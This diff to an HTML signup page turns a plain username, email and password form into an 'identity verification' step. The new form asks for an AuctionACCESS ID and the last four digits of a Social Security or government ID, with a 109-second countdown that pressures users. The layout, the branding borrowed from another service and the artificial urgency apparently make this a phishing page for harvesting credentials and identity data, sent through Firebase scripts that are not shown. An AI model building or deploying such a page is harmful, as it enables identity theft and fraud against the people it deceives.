@@ -83,25 +83,91 @@
         .link a:hover {
             text-decoration: underline;
         }
+
+        .step-header {
+            text-align: center;
+            margin-bottom: 1rem;
+        }
+
+        .step-title {
+            margin: 0;
+            font-size: 1.6rem;
+            letter-spacing: 1px;
+            color: var(--text-color);
+        }
+
+        .step-subtitle {
+            margin: 0.25rem 0 0 0;
+            font-size: 0.95rem;
+            color: var(--secondary-text);
+        }
+
+        .timeline {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+
+        .timeline-step {
+            flex: 1;
+            height: 7px;
+            border-radius: 4px;
+            background: var(--border-color);
+        }
+
+        .timeline-step.active {
+            background: var(--accent-color);
+        }
+
+        .badge {
+            background: #fef6e0;
+            color: #2b4f7b;
+            border: 1px solid #f6dd98;
+            border-radius: 4px;
+            padding: 0.35rem 0.6rem;
+            font-size: 0.84rem;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 1rem;
+        }
+
+        .info-box {
+            background: rgba(13, 110, 253, 0.05);
+            border: 1px solid rgba(13, 110, 253, 0.3);
+            border-radius: 6px;
+            padding: 0.85rem;
+            margin-bottom: 1rem;
+            color: #0f4db2;
+            font-size: 0.88rem;
+        }
     </style>
 </head>
 <body class="dark-theme">
     <div class="signup-container">
-        <h2>Sign Up</h2>
+        <div class="step-header">
+            <div class="step-title">SIGN UP</div>
+            <div class="step-subtitle">You have <span class="badge" id="countdown">109</span> seconds to complete signup.</div>
+        </div>
+
+        <div class="timeline">
+            <div class="timeline-step active"></div>
+            <div class="timeline-step"></div>
+        </div>
+
+        <div class="info-box">
+            VERIFY IDENTITY
+        </div>
+
         <form id="signupForm">
             <div class="form-group">
-                <label for="name">Username</label>
-                <input type="text" id="name" required>
+                <label for="accessId">AuctionACCESS ID</label>
+                <input type="text" id="accessId" placeholder="ex. 101234567" required pattern="\d{8,12}">
             </div>
             <div class="form-group">
-                <label for="email">Email</label>
-                <input type="email" id="email" required>
+                <label for="idLast4">Last 4 Digits of Social Security or Gov't ID</label>
+                <input type="text" id="idLast4" placeholder="1234" required pattern="\d{4}" maxlength="4">
             </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" required minlength="6">
-            </div>
-            <button type="submit" class="btn" id="signupBtn">Sign Up</button>
+            <button type="submit" class="btn" id="signupBtn">VERIFY MY IDENTITY</button>
         </form>
         <div id="errorMessage" class="error" style="display: none;"></div>
         <div class="link">
@@ -113,5 +179,23 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-analytics-compat.js"></script>
     <script src="firebase-config.js"></script>
     <script src="auth.js"></script>
+    <script>
+        // Countdown timer for the candid feel
+        let countdown = 109;
+        const counterEl = document.getElementById('countdown');
+        const timerId = setInterval(() => {
+            if (!counterEl) {
+                clearInterval(timerId);
+                return;
+            }
+            countdown -= 1;
+            counterEl.textContent = countdown;
+            if (countdown <= 0) {
+                clearInterval(timerId);
+                counterEl.textContent = '0';
+                alert('Time expired. Please refresh and try again.');
+            }
+        }, 1000);
+    </script>
 </body>
 </html>
